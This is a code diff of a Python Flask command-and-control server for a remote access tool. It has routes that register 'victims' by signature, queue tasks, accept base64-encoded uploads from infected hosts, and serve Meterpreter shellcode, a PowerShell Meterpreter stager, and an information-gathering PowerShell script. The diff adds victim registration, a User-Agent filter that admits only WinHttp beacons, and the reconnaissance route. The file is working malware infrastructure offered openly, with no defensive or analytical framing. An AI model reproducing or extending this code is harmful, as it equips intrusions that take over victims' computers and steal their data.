@@ -1,6 +1,5 @@
 #!/usr/bin/python
 # coding: UTF-8
-import random
 import sys
 import hashlib
 import time
@@ -23,6 +22,28 @@ server = '%s:%d'%(host, port)
 
 def md5(s):
     return hashlib.md5(s).hexdigest()
+
+@client.route("/connect", methods=['GET'])
+def connect():
+    if not 'WinHttp.WinHttpRequest' in request.headers.get('User-Agent'):
+        return ''
+    global server
+    p = payload.payload()
+    return render_template_string(p.connect(), server=server)
+
+@client.route("/check", methods=['POST'])
+def check():
+    global server
+    data = unquote(request.get_data())
+    #TODO: add data format check
+    signature = md5(data+SECRET_KEY)
+    c = victim.victim()
+    p = payload.payload()
+    if not c.get(signature):
+        c = c.add(signature, request.remote_addr)
+        #添加初始任务
+        action.action().add(signature, signature, 'init', p.init(), 4) #add init task
+    return render_template_string(p.begin(), server=server, signature=signature) 
 
 @client.route('/rat/<signature>', methods=['GET', 'POST'])
 def rat(signature):
@@ -47,7 +68,12 @@ def rat(signature):
 
         #查找未完成任务
         ac = a.gettask(signature)
-        if ac and ac['repeat']<3:
+
+        if ac and signature == ac['pid']:
+            a.setfeedback(signature, 'done')
+            exploit = ac['payload']
+            pid = ac['pid']
+        elif ac and ac['repeat']<3:
             exploit = ac['payload']
             pid = ac['pid']
             a.addrepeat(pid)
@@ -80,7 +106,6 @@ def upload_controller(signature):
     try:
         data = base64.b64decode(data)
     except Exception as e:
-        print e
         return 'error'
     originalname = request.args.get('filename')
     pid = request.args.get('pid')
@@ -106,19 +131,6 @@ def download_controller():
     with open(download_dir+os.sep+filename, 'r') as f:
         data = f.read()
     return base64.b64encode(data)
-
-@client.route("/connect", methods=['GET'])
-def connect():
-    global server
-    c = victim.victim()
-    p = payload.payload()
-    signature = md5(str(time.time())+SECRET_KEY+request.remote_addr+str(random.random()))
-    if c.get(signature):
-        signature = md5(str(time.time())+SECRET_KEY+request.remote_addr)
-    c = c.add(signature, request.remote_addr)
-    #TODO:添加初始任务
-    #a = action.action().add(signature, 'init', 'payload', 4) #add init task
-    return render_template_string(p.connect(), server=server, signature=signature)
 
 @client.route("/met_sc/<signature>", methods=['GET'])
 def MeterpreterShellcode(signature):
@@ -155,3 +167,13 @@ def PowershelMeterpreter(signature):
     for i in struct.pack('!I', int(s.get('LPORT')))[-2:]:
         port += hex(ord(i)) + ', '
     return render_template('PowershellMeterpreterx86.ps1', ip=ip, port=port)
+
+@client.route("/ps_info/<signature>", methods=['GET'])
+def PowershelInformation(signature):
+    c = victim.victim()
+    pattern = r"^[0-9a-f]{32}$"
+    if not re.match(pattern, signature):
+        return "error"
+    if not c.get(signature):
+        return 'error'
+    return render_template('GatherInformation.ps1')
